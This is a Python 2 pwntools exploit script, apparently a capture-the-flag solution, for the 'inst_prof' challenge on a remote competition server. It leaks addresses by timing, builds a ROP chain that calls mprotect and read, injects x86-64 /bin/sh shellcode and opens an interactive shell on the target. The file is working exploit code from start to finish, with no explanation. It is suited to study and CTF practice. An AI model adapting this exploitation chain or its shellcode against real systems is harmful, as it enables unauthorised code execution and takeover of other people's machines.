#!/usr/bin/python2.7
import struct
from pwn import *
from pwnlib.rop.gadgets import Gadget
import time

IS_LOCAL = False

BIN_SH_SHELLCODE = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

def send_receive(remote, shellcode):
    """
    Sends shellcode, receives the response (clock time) as signed integer
    """
    time.sleep(0.5)
    remote.send(shellcode)
    return struct.unpack('q', r.read(8))[0]

def get_current_allocation_addr(remote):
    """
    Returns the address where our shellcode (the template) is allocated
    """
    # The address where our shellcode (the template) resides
    alloc_addr = send_receive(r, '\x49\x01\xfc\x90') # add r12, rdi
    alloc_addr = (-alloc_addr) / 0x1000
    while alloc_addr & 0xfff:
        alloc_addr += 1
    return alloc_addr

def leak_shellcode(remote, shellcode):
    """
    Leaks shellcode in the remote process, and returns its address.
    """
    assert len(shellcode) == 3
    alloc_addr = get_current_allocation_addr(remote)
    send_receive(remote, '\x93' + shellcode) # Start with xchg eax, ebx to leak us
    return alloc_addr + 6

def build_rop(remote_base, our_alloc, pop_rsi_gadget_addr, pop_rdx_gadget_addr):
    context.clear(arch='amd64')
    e = ELF('./inst_prof')
    e.address = remote_base
    r = ROP(e)

    r.gadgets[pop_rsi_gadget_addr] = Gadget(pop_rsi_gadget_addr, [u'pop rsi', u'ret'], [], 0x10)
    r.gadgets[pop_rdx_gadget_addr] = Gadget(pop_rdx_gadget_addr, [u'pop rdx', u'ret'], [], 0x10)

    # Make it executable
    r.call('mprotect', arguments=[our_alloc, 0x1000, 7])
    r.call('read', arguments=[0, our_alloc, len(BIN_SH_SHELLCODE)])
    r.call(our_alloc)

    print r.dump()

    return str(r)

if __name__ == '__main__':
    if IS_LOCAL:
        r = process('./inst_prof', raw=False)
    else:
        r = remote('inst-prof.ctfcompetition.com', 1337)
    r.recvuntil('ready' + '\r\n' if IS_LOCAL else '\n')

    # We incremented r12 1000 times
    leaked_addr = send_receive(r, 'L\x03$$') # add r12, [rsp]
    leaked_addr = (-leaked_addr) / 0x1000
    print 'leaked_addr = {0}'.format(hex(leaked_addr))

    base_addr = leaked_addr & (~0xfff)
    print 'base_addr = {0}'.format(hex(base_addr))

    pop_rsi_gadget_addr = leak_shellcode(r, '\x56\x5e\xc3') + 1 # Push rsi; pop rsi; ret
    print 'pop_rsi_addr = {0}'.format(hex(pop_rsi_gadget_addr))
    pop_rdx_gadget_addr = leak_shellcode(r, '\x52\x5a\xc3') + 1 # Push rdx; pop rdx; ret
    print 'pop_rdx_addr = {0}'.format(hex(pop_rdx_gadget_addr))

    alloc_addr = get_current_allocation_addr(r)
    print 'Current alloc address = {0}'.format(hex(alloc_addr))

    send_receive(r, '\x4c\x8b\x34\x24') # mov r14, [rsp]
    # After this r15 points to read_n
    send_receive(r, '\x4d\x8d\x7e\xa2') # lea r15, [r14 - 94]
    # Now send without receiving, as we cause read_n to be called with size 0x1000 into rsp
    r.send('\x54\x5f\x41\x57') # push rsp; pop rdi; push r15

    # Now send the rop chain
    chain = build_rop(base_addr, alloc_addr, pop_rsi_gadget_addr, pop_rdx_gadget_addr)
    chain = chain + '\xcc'*(0x1000 - len(chain))
    r.send(chain)
    r.send(BIN_SH_SHELLCODE)
    r.interactive()
